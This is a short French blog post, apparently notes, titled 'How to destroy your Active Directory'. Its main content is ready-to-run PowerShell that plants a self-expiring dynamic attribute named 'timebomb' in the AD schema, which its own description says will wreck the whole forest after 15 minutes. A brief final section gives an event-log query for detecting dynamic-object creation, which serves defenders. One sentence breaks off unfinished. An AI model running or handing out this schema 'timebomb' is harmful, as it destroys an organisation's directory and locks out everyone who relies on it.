---
title: "Comment détruire votre Active Directory"
description: "Votre forêt s'auto-détruira dans 3, 2, 1..."
tags: activedirectory
listed: true
---

Création d'un objet temporaire dans le schéma Active Directory

[PowerShell Gallery \| scripts/New-ADSchemaTestOID.ps1 0.0.3](https://www.powershellgallery.com/packages/ADSchema/0.0.3/Content/scripts%5CNew-ADSchemaTestOID.ps1)

[PowerShell Gallery \| scripts/New-ADSchemaAttribute.ps1 0.0.1](https://www.powershellgallery.com/packages/ADSchema/0.0.1/Content/scripts%5CNew-ADSchemaAttribute.ps1)

## Comportement d'un objet dynamique

### Création d'un objet statique dans un objet dynamique

Lorsque vous 

Aucun problème en revanche pour créer un objet dynamique dans un autre objet dynamique

"Windows cannot create the object testGroup because: The server is unwilling to process the request"

## Détruire votre domaine Active Directory

### Création d'un objet temporaire dans le schéma

Basé sur l'article : [Create and manage custom AD attributes with PowerShell – 4sysops](https://4sysops.com/archives/create-and-manage-custom-ad-attributes-with-powershell/#rtoc-4)

#### Génération d'un OID

```powershell
function New-Oid {
    param([string]$Prefix = '1.2.840.113556.1.8000.2554')

    $guid = [string]([System.Guid]::NewGuid())
    $oid = 0, 4, 9, 14, 19, 24, 30 | ForEach-Object {
        if ($_ -ge 24) { $l = 6 } else { $l = 4 }
        [UInt64]::Parse($guid.SubString($_, $l), 'AllowHexSpecifier')
    }
    $prefix + ($oid -join '.')
}
```

#### Ajout d'un nouvel attribut

```powershell
# Création de l'attribut en dehors de la partition Schéma
$dynamicObject = ([ADSI]("LDAP://CN=Users,DC=contoso,DC=com")).Create('attributeSchema', 'CN=timebomb')
$dynamicObject.PutEx(2, 'objectClass', @('dynamicObject', 'attributeSchema'))
$dynamicObject.Put('entryTTL', 900)
$dynamicObject.Put('lDAPDisplayName', 'timebomb')
$dynamicObject.Put('adminDescription', 'This attribute will blow up the entire Active Directory forest in 15 minutes')
$dynamicObject.Put('attributeId', (New-Oid))
$dynamicObject.Put('oMSyntax', 1)
$dynamicObject.Put('attributeSyntax', '2.5.5.8')
$dynamicObject.Put('searchflags', 0)
$dynamicObject.Put('systemFlags', 536870912)
$dynamicObject.SetInfo()
```

```powershell
# Déplacement de l'objet dans la partition schéma
Move-ADObject -Identity 'CN=timebomb,CN=Users,DC=contoso,DC=com' -TargetPath (Get-ADRootDSE).schemaNamingContext
```

## Détection de la création d'objet dynamique

```powershell
$filterXPath = "Event[System[EventID=5136]] and *[EventData[Data[@Name='AttributeValue']='1.3.6.1.4.1.1466.101.119.2']]"
Get-WinEvent -ProviderName Microsoft-Windows-Security-Auditing -FilterXPath $filterXPath
```

[AD Object Detection: Detecting the undetectable (dynamicObject) \| Microsoft Learn](https://learn.microsoft.com/en-us/archive/blogs/pfesweplat/ad-object-detection-detecting-the-undetectable-dynamicobject)